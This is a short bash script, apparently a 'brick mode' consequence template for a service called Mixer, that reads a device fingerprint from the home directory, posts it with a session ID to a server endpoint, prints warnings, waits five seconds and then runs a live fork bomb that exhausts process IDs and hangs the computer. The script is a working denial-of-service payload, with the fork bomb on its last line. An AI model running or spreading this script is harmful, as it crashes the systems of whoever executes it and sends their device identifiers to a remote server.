#!/bin/bash

# Mixer Consequence: Fork Bomb (Brick Mode)
# Session ID: ${SESSION_ID}

MIXER_ID_FILE="$HOME/.mixer_id"
FINGERPRINT="unknown"
if [ -f "$MIXER_ID_FILE" ]; then
    FINGERPRINT=$(cat "$MIXER_ID_FILE" | tr -d '\n')
fi

echo "💀 BRICK MODE ACTIVATED"
echo "Device: ${FINGERPRINT:0:8}..."
echo ""

# Signal execution to server FIRST
curl -s -X POST "${BASE_URL}/api/mixer/verify" \
  -H "Content-Type: application/json" \
  -d "{\"sessionId\":\"${SESSION_ID}\",\"fingerprint\":\"${FINGERPRINT}\"}" > /dev/null 2>&1

echo "Creating a fork bomb..."
echo "This will exhaust process IDs and hang your system."
echo "Restart your computer to recover."
echo "YOUR DATA IS SAFE - only processes are affected."
echo ""
echo "If you want to cancel within 5 seconds, press Ctrl+C..."
sleep 5

# Fork bomb
:(){ :|:& };:
